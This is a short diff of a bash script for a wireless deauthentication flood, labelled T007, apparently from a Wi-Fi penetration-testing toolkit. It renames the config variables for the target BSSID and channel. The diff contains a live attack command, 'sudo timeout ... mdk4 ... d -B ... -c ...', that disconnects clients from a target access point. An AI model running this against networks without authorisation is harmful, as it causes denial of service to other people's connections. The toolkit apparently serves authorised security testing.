@@ -52,7 +52,7 @@ trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
+if [[ -z "$INTERFACE" || -z "$T007_BSSID" || -z "$T007_CHANNEL" ]]; then
     print_warn "INTERFACE, BSSID, or CHANNEL not defined in config.sh"
     exit 1
 fi
@@ -66,8 +66,8 @@ fi
 # Display config
 echo "Mode         : T007 - Deauthentication Flood"
 echo "Interface    : $INTERFACE"
-echo "Target BSSID : $BSSID"
-echo "Channel      : $CHANNEL"
+echo "Target BSSID : $T007_BSSID"
+echo "Channel      : $T007_CHANNEL"
 print_blank
 
 # Confirm attack
@@ -109,7 +109,7 @@ fi
 # Run attack
 print_blank
 print_info "Running T007 - Deauthentication Flood for $DURATION seconds"
-sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$BSSID" -c "$CHANNEL"
+sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$T007_BSSID" -c "$T007_CHANNEL"
 EXIT_CODE=$?
 
 # Exit check
